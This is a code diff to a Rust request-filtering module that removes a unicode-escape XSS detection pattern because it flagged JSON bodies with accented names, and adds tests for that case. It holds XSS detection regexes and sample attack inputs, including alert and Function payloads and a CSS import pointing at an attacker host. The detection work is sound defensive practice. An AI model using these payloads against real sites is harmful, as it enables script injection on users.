@@ -43,7 +43,11 @@ static XSS_PATTERNS: LazyLock<Vec<Regex>> = LazyLock::new(|| {
         r"(?i)\.innerHTML\s*=",
         r"(?i)\.outerHTML\s*=",
         r"(?i)fromCharCode\s*\(",
-        r"(?i)\\u00[0-9a-f]{2}",
+        // S6 (2026-06-18): the `\u00XX` escape pattern was dropped — it
+        // tripped on every JSON body carrying a non-ASCII char (accented
+        // names, addresses), a large benign surface. A bare unicode escape
+        // is not executable; real XSS that uses it also carries
+        // `<script`/`alert(`/`.innerHTML=`, which the other patterns catch.
         r#"(?i)<meta\s+[^>]*http-equiv\s*=\s*['"]?refresh"#,
     ]
     .iter()
@@ -256,7 +260,6 @@ mod tests {
     positive!(xss_function_constructor, "/?q=Function%28%27alert%281%29%27%29%28%29");
     positive!(xss_innerhtml, "/?q=.innerHTML=payload");
     positive!(xss_from_char_code, "/?q=fromCharCode(65)");
-    positive!(xss_unicode_escape, "/?q=\\u0041");
     positive!(xss_prompt, "/?q=prompt('xss')");
     positive!(xss_confirm, "/?q=confirm('xss')");
     positive!(xss_alert, "/?q=alert(document.domain)");
@@ -445,6 +448,24 @@ mod tests {
 
     // Query path (percent-encoded) — proves the URI scan, not just body.
     positive!(css_import_in_query, "/g?css=@import%20url(http://attacker.evil.com/)");
+
+    // S6 (2026-06-18) — JSON bodies routinely encode non-ASCII characters
+    // as `\uXXXX` escapes (accented Latin names, addresses, free text). The
+    // old `\\u00[0-9a-f]{2}` pattern tripped on every such body — e.g. a
+    // profile update with display_name "María José" serializes to the wire as
+    // `María José` → XSS BLOCK. A bare unicode escape is not itself
+    // executable; real XSS that uses it always also carries
+    // `<script`/`alert(`/`.innerHTML=`, which the other patterns catch. The
+    // escape pattern is dropped. (Raw strings below keep the `\u` literal,
+    // matching exactly what the JSON serializer puts on the wire.)
+    css_negative!(
+        json_accented_display_name,
+        "{\"email\": \"user.name+tag@sub.example.co.uk\", \"display_name\": \"Mar\\u00eda Jos\\u00e9\"}"
+    );
+    css_negative!(
+        json_accented_name_run,
+        "{\"city\": \"M\\u00fcnchen\", \"note\": \"\\u00e9\\u00e8\\u00ea\"}"
+    );
 
     #[test]
     fn css_injection_uses_distinct_tag() {
